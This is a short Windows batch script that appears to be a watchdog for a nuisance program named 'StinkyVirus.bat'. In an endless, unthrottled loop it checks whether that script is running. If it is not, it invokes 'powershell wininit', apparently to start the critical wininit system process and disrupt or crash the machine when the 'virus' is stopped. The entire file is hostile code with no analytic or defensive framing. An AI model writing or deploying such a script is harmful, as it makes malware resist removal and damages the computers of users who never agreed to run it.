@echo off
:look
TASKLIST | FINDSTR StinkyVirus.bat || powershell wininit
goto look